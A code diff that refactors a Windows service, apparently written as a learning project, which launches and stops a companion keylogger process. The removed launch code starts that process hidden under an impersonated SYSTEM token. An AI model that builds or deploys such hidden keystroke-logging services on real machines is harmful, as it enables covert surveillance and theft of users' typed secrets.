@@ -4,7 +4,7 @@
 using namespace std;
 
 extern tinky_t tinky;
-
+extern processes_t processes;
 
 static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
 	tinky.svcStatus.dwCurrentState = currentState;
@@ -13,20 +13,27 @@ static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
 	SetServiceStatus(tinky.svcStatusHandle, &tinky.svcStatus);
 }
 
-static void stopTinkyWinkey(void) {
+static void stopAllProcesses(void) {
 	SetEvent(tinky.tinkyStopEventHandle);
-	SetEvent(tinky.winkeyStopEventHandle);
+	SetEvent(processes.stopEventHandle);
 
-	if (!TerminateProcess(tinky.processInfo.hProcess, NONE)) {
+	// terminateProcesses() TODO
+	if (!TerminateProcess(processes.winkeyProcessInfo.hProcess, NONE)) {
 		journalReport(wstring(L"Terminate process failed with code: ") + itostring(GetLastError()) + wstring(L"\n"));
 	} // is it needed if the process stop by himself ?
 
-	if (tinky.processInfo.hProcess)
-		CloseHandle(tinky.processInfo.hProcess);
+	// closeProcesses() TODO
+	if (processes.winkeyProcessInfo.hProcess)
+		CloseHandle(processes.winkeyProcessInfo.hProcess);
 
-	if (tinky.processInfo.hThread)
-		CloseHandle(tinky.processInfo.hThread);
+	if (processes.winkeyProcessInfo.hThread)
+		CloseHandle(processes.winkeyProcessInfo.hThread);
 
+	if (processes.systemToken)
+		CloseHandle(processes.systemToken);
+
+	if (tinky.tinkyStopEventHandle)
+		CloseHandle(tinky.tinkyStopEventHandle);
 	sendStatus(SERVICE_STOPPED, NONE);
 }
 
@@ -36,11 +43,11 @@ DWORD WINAPI controlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventDa
 		case (SERVICE_CONTROL_INTERROGATE):
 			return (NO_ERROR);
 		case (SERVICE_CONTROL_STOP):
-			stopTinkyWinkey();
+			stopAllProcesses();
 			return (NO_ERROR);
 		case (SERVICE_CONTROL_SHUTDOWN):
 			//reportKeyLogs();
-			stopTinkyWinkey();
+			stopAllProcesses();
 			return (NO_ERROR);
 	}
 	(void)dwEventType; // Event type, handle only if dwControl == SERVICE_CONTROL_SESSIONCHANGE
@@ -66,34 +73,13 @@ static HANDLE createEvent(const wchar_t *eventName) {
 	);
 }
 
-static BYTE launchProcess() {
-	wstring processPath = getServicePath(KYLG_NAME);
-	journalReport(L"Found process path: " + processPath);
-
-	if (!CreateProcessAsUserW(
-		tinky.systemToken,
-		processPath.c_str(),
-		NULL, NULL, NULL,
-		FALSE,
-		CREATE_NO_WINDOW,
-		NULL, NULL,
-		&tinky.startupInfo,
-		&tinky.processInfo
-	)) {
-		journalReport(L"Process failed to launch with code: \n" + itostring(GetLastError()));
-		return (FAILURE);
-	}
-	journalReport(L"Process launched\n");
-	return (SUCCESS);
-}
-
 static BYTE initService(void) {
 	impersonate();
 	registerControlHandler();
 	tinky.svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
 	sendStatus(SERVICE_START_PENDING, NONE);
 
-	tinky.winkeyStopEventHandle = createEvent(WINKEY_STOP);
+	processes.stopEventHandle = createEvent(PROCESSES_STOP);
 	tinky.tinkyStopEventHandle = createEvent(NO_NAME);
 	return (SUCCESS);
 }
@@ -103,7 +89,7 @@ VOID WINAPI serviceMain(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
 	if (!initService())
 		return ;
 
-	if (!launchProcess()) {
+	if (!launchProcess(dwNumServicesArgs, lpServiceArgVectors)) {
 
 		sendStatus(SERVICE_STOPPED, NONE);
 		return ;
